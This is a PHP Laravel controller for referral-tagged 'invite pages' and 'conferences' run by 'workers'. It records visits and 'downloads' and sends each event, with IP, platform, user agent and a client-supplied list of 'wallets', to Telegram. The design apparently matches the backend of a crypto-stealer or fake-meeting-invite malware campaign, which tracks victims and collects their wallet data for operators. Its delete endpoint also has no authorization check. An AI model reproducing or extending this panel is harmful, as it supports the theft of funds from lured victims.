<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\InvitePage;
use App\Models\Visit;
use App\Models\Download;
use App\Services\TelegramService;
use Illuminate\Http\Request;

class InvitePageController extends Controller
{
    public function getWorkerTag($ref)
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->firstOrFail();

        return response()->json([
            'tag' => $invitePage->worker_tag
        ]);
    }

    public function getByRef($ref)
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->with('conference')
            ->firstOrFail();

        return response()->json([
            'page' => [
                'id' => $invitePage->id,
                'conference_id' => $invitePage->conference_id,
                'ref' => $invitePage->ref,
                'title' => $invitePage->title
            ]
        ]);
    }

    public function recordVisit($ref)
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->firstOrFail();

        Visit::create([
            'type' => 'invite_page',
            'reference_id' => $ref,
            'ip_address' => request()->ip(),
            'user_agent' => request()->userAgent()
        ]);

        // Отправляем уведомление в Telegram
        $telegram = new TelegramService();
        $telegram->notifyPageVisit(
            'invite_page',
            $ref,
            request()->ip(),
            request()->userAgent()
        );

        return response()->json([
            'success' => true,
            'message' => 'Visit recorded'
        ]);
    }

    public function recordDownload($ref)
    {
        $invitePage = InvitePage::where('ref', $ref)
            ->where('is_active', true)
            ->firstOrFail();

        Download::create([
            'type' => 'invite_page',
            'reference_id' => $ref,
            'platform' => request()->input('platform', 'unknown'),
            'tag' => request()->input('tag'),
            'user_agent' => request()->userAgent(),
            'wallets' => request()->input('wallets', []),
            'ip_address' => request()->ip()
        ]);

        // Отправляем уведомление в Telegram
        $telegram = new TelegramService();
        $telegram->notifyDownload(
            'invite_page',
            $ref,
            request()->input('platform', 'unknown'),
            request()->ip(),
            request()->userAgent(),
            request()->input('wallets', [])
        );

        return response()->json([
            'success' => true,
            'message' => 'Download recorded'
        ]);
    }

    public function index(Request $request)
    {
        $token = $request->bearerToken();
        $worker = \App\Models\Worker::where('tag', $token)
            ->where('is_active', true)
            ->first();

        if (!$worker) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }

        $pages = InvitePage::where('is_active', true)->get();

        return response()->json([
            'pages' => $pages->map(function ($page) {
                return [
                    'id' => $page->id,
                    'title' => $page->title,
                    'ref' => $page->ref,
                    'conference_id' => $page->conference_id,
                    'worker_tag' => $page->worker_tag,
                    'created_at' => $page->created_at->toISOString()
                ];
            })
        ]);
    }

    public function store(Request $request)
    {
        $request->validate([
            'title' => 'required|string|max:255',
            'ref' => 'nullable|string|max:255|unique:invite_pages,ref',
            'domain' => 'nullable|string|max:255'
        ]);

        $token = $request->bearerToken();
        $worker = \App\Models\Worker::where('tag', $token)
            ->where('is_active', true)
            ->first();

        if (!$worker) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }

        // Если ref не пришел, генерируем случайный ref
        $ref = $request->filled('ref') ? $request->ref : strtoupper(substr(md5(uniqid(mt_rand(), true)), 0, 10));

        // Создаем конференцию для страницы приглашения
        $conference = \App\Models\Conference::create([
            'title' => $request->title,
            'invite_code' => $this->generateInviteCode(),
            'worker_tag' => $worker->tag,
            'is_active' => true
        ]);

        $page = InvitePage::create([
            'title' => $request->title,
            'ref' => $ref,
            'conference_id' => $conference->id,
            'worker_tag' => $worker->tag,
            'is_active' => true
        ]);

        return response()->json([
            'page' => [
                'id' => $page->id,
                'title' => $page->title,
                'ref' => $page->ref,
                'conference_id' => $page->conference_id,
                'worker_tag' => $page->worker_tag,
                'created_at' => $page->created_at->toISOString()
            ]
        ]);
    }

    public function destroy($id)
    {
        $page = InvitePage::findOrFail($id);
        $page->delete();

        return response()->json([
            'success' => true,
            'message' => 'Page deleted'
        ]);
    }

    private function generateInviteCode()
    {
        return strtoupper(substr(md5(uniqid()), 0, 8));
    }
}